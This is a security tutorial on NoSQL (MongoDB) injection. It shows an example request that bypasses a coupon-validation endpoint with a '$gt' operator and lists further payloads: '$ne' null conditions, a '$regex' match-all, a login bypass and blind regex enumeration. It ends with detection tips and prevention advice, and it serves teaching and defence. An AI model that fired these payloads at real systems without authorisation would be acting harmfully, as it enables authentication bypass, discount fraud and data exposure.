# 🧬 NoSQL Injection

## What It Is

**NoSQL Injection** happens when user input flows into a NoSQL database query (think MongoDB) without proper validation first. Because NoSQL query languages often accept structured objects rather than plain strings, an attacker can inject special operators that warp the query's logic — bypassing authentication, pulling out data they shouldn't see, or otherwise messing with the app's intended behavior.

---

## 🎯 Where to Look

Endpoints that take user-supplied values and feed them into a NoSQL query are the prime targets — things like:
- Coupon/discount validation endpoints
- Login/authentication endpoints
- Search or filter endpoints that query a Mongo-backed collection

## 🧪 Example: Bypassing Coupon Validation

**Request:**
```http
POST /community/api/v2/coupon/validate-coupon HTTP/1.1
Host: <target-host>
Authorization: Bearer <JWT_TOKEN>
Content-Type: application/json

{
  "coupon_code": { "$gt": "" }
}
```

### Why This Works

The `coupon_code` field is supposed to be a plain string, but the application happily accepts a JSON object containing a MongoDB query operator instead:
```json
{ "$gt": "" }
```

That changes what the backend actually queries. Instead of running something like:
```javascript
db.coupons.findOne({ coupon_code: "USER_INPUT" })
```

it ends up running:
```javascript
db.coupons.findOne({ coupon_code: { $gt: "" } })
```

Since virtually every real coupon code is "greater than" an empty string, this returns the *first matching coupon in the collection* — completely sidestepping whatever validation the app thought it was doing.

### Impact
- 🔓 Authentication or validation logic gets bypassed
- 🎁 Unauthorized access to discounts or gated features
- 📂 Potential exposure of data through manipulated queries
- 🧠 Broader abuse of business logic built on top of that query

## 🧪 More Payload Patterns to Try

**Always-true condition:**
```json
{"coupon_code":{"$ne":null}}
```

**Regex-based bypass:**
```json
{"coupon_code":{"$regex":".*"}}
```

**Classic auth bypass pattern:**
```json
{"username":{"$ne":null}, "password":{"$ne":null}}
```

**Blind NoSQL injection (character-by-character enumeration):**
```json
{"coupon_code":{"$regex":"^A"}}
```

---

## 🔎 How to Spot It

- Try sending a JSON object where the app expects a plain string
- Test common Mongo operators in place of normal values:
  - `$ne`
  - `$gt`
  - `$lt`
  - `$regex`
- Watch closely for:
  - Any shift in how the application responds
  - Validation that suddenly "passes" when it shouldn't
  - Data coming back that you have no business seeing

---

## 🛡️ How to Prevent It

### Enforce Strict Input Types
Require that fields like `coupon_code` are validated as plain strings — and reject the request outright if a JSON object or array shows up where a string was expected.

### Use Parameterized Queries / Safe Query Builders
Avoid directly splicing raw user input into a query object. Lean on your ORM or query builder's safe methods instead of building queries by hand from request data.

### Sanitize Special Characters
Strip or explicitly block characters tied to MongoDB operators — particularly `$` and `.` — from any field that gets used in a query.

### Apply Schema Validation
Use database-level schema validation (MongoDB supports this natively) so malformed or unexpected document shapes get rejected before they're even queried against.

### Apply Least Privilege
Scope database credentials down to only what each service actually needs, so even a successful injection has a much smaller blast radius.

---

## 🔑 Key Takeaway

NoSQL injection lets an attacker hijack a database query's logic simply by injecting structured operators into fields that were only ever supposed to hold plain values. Solid input validation, careful sanitization, and disciplined query handling are what stand between a normal-looking request and a full authentication bypass.
